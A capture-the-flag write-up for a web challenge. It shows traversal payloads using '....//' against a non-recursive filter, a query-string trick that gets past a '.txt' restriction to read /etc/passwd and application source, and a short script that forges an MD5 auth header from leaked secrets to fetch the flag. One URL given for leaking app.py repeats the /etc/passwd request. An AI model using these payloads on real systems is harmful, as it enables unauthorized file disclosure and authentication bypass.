# Protected area 1 (Web, 119p, 41 solved)

In the challenge we get access to a webpage.
In the source we can find a JS which uses some of the rest endpoints:

```js

var file_check = function(file){

    $.ajax({
        url: '/check_perm/readable/',
        data: {'file': file}
    }).done(function(data){
        if (data == "True") {
            file_read(file)
        }else{
            console.log('fail')
        }
    })
}

var file_read = function(file){

    $.ajax({
        url: '/read_file/',
        data: {'file': file}
    }).done(function(data){
        update_page(data)
    })

    return
}

var update_page = function(text){
    $("#t").append(text)
}

$(document).ready(function() {
    console.log("ready!");

    file_check('public.txt');
});
```

This means there are 2 endpoints:

1. Checking permissions for the files.
2. Reading files.

If we poke around a bit, we can notice that there is a path traversal bug there.
To be fair, this was much easier to spot with the part 2 of this problem, since part 2 was actually showing errors, including the file path it "calculated" based on our inputs.

It seems the page is simply removing `../` but doesn't do this recursively, so we can inject `....//` and when it removes `../` we're left with `../`.

From this we can do for example: `http://66.172.33.148:8008/read_file/?file=....//files/public.txt` and it reads the file just fine. 
We are restricted, however, to `.txt` files.

After some poking around we accidentally noticed that in fact the `.txt` filter somehow looks at the whole query, and not at the `file` variable!

We can verify this with: `66.172.33.148:8008/read_file/?file=....//....//....//etc/passwd&fakevar=public.txt`

Now we just need to leak the source code, starting with standard `app.py.` -> `66.172.33.148:8008/read_file/?file=....//....//....//etc/passwd&fakevar=public.txt`

Once we leak most of the source code we find `api.py` with:

```python
@app.route('/protected_area_0098', methods=['GET'])
@check_login
def app_protected_area() -> str:
    return Config.FLAG
```

And `functions.py` with login logic:

```python
def check_login(f):
    """
    Wraps routing functions that require a user to be logged in
    """
    @wraps(f)
    def wrapper(*args, **kwds):
        try:
            ah = request.headers.get('ah')

            if ah == hashlib.md5((Config.ADMIN_PASS + Config.SECRET).encode("utf-8")).hexdigest():
                return f(*args, **kwds)
            else:
                return abort(403)

        except:
            return abort(403)
        
    return wrapper
```

And also `config.py` with:

```python
FLAG       = os.environ.get('FLAG')
SECRET     = "s3cr3t"
ADMIN_PASS = "b5ec168843f71c6f6c30808c78b9f55d"
```

Now we can simply calculate the admin password and log-in to get the flag:

```python
import hashlib
import requests

def main():
    SECRET = "s3cr3t"
    ADMIN_PASS = "b5ec168843f71c6f6c30808c78b9f55d"
    p = hashlib.md5(ADMIN_PASS + SECRET).hexdigest()
    url = 'http://66.172.33.148:8008/protected_area_0098'
    r = requests.get(url, headers={"ah": p})
    print(r.text)


main()
```

`ASIS{f70a0203d638a0c90a490ad46a94e394}`
